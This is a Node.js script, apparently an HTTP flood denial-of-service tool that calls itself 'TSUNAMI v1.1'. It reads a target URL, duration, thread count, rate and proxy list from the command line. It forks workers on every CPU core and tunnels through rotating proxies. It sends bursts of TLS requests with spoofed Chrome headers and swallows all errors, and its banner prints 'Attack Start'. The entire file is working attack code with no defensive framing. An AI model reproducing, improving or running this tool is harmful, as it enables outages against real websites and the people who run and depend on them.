const url = require('url');
const http = require('http');
const tls = require('tls');
const crypto = require('crypto');
const cluster = require('cluster');
const os = require('os');
const fs = require('fs');

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {   
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];

const parsed = url.parse(target);
const proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');

function buildRequest() {
    const headers =
        `${reqmethod} ${parsed.path} HTTP/1.1\r\n` +
        `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n` +
        'Accept-Encoding: gzip, deflate, br\r\n' +
        'Accept-Language: en-US,en;q=0.7\r\n' +
        'Cache-Control: max-age=0\r\n' +
        'Connection: Keep-Alive\r\n' +
        `Host: ${parsed.host}\r\n` +
        'Sec-Fetch-Dest: document\r\n' +
        'Sec-Fetch-Mode: navigate\r\n' +
        'Sec-Fetch-Site: none\r\n' +
        'Sec-Fetch-User: ?1\r\n' +
        'Upgrade-Insecure-Requests: 1\r\n' +
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36\r\n' +
        'sec-ch-ua: "Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"\r\n' +
        'sec-ch-ua-mobile: ?0\r\n' +
        'sec-ch-ua-platform: "Windows"\r\n\r\n';
    return headers;
}

function go() {
    const randomProxy = proxies[Math.floor(Math.random() * proxies.length)];
    const [proxyHost, proxyPort] = randomProxy.split(':');
    
    const agent = new http.Agent({
        keepAlive: true,
        keepAliveMsecs: 50000,
        maxSockets: Infinity,
        maxFreeSockets: Infinity,
        maxTotalSockets: Infinity,
        timeout: time * 1000,
    });

    const req = http.request({
        host: proxyHost,
        port: proxyPort,
        agent: agent,
        headers: {
            Host: parsed.host,
            'Proxy-Connection': 'Keep-Alive',
            Connection: 'Keep-Alive',
        },
        method: 'CONNECT',
        path: `${parsed.host}:443`,
    });

    req.on('connect', (res, socket, head) => {
        const tlsConnection = tls.connect({
        ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
        secureProtocol: ['TLSv1_2_method','TLSv1_3_method', 'SSL_OP_NO_SSLv3', 'SSL_OP_NO_SSLv2', 'TLS_OP_NO_TLS_1_1', 'TLS_OP_NO_TLS_1_0'],
        servername: parsed.host,
        socket: socket
        }, () => {
            for (let j = 0; j < ratelimit; j++) {
                tlsConnection.setKeepAlive(true, 10000);
                tlsConnection.setTimeout(10000);
                const r = buildRequest();
                console.log('Sending request:', r);
                tlsConnection.write(r);
            }
            });

        tlsConnection.on('disconnected', () => {
            tlsConnection.destroy();
        });

        tlsConnection.on('timeout', () => {
            tlsConnection.destroy();
        });

        tlsConnection.on('error', (err) => {
            tlsConnection.destroy();
        });

        tlsConnection.on('data', (chunk) => {
            setTimeout(() => {
                tlsConnection.abort();
                delete tlsConnection;
            }, 1000);
        });
        
        tlsConnection.on('end', () => {
            tlsConnection.abort();
            tlsConnection.destroy();
        }).end();
    });
}

if (cluster.isMaster) {
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`Attack Start / @rapidreset love you <3 / TSUNAMI v1.1`);

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    setTimeout(() => process.exit(1), time * 1000);
} else {
    setInterval(go);
    setTimeout(() => process.exit(1), time * 1000);
}
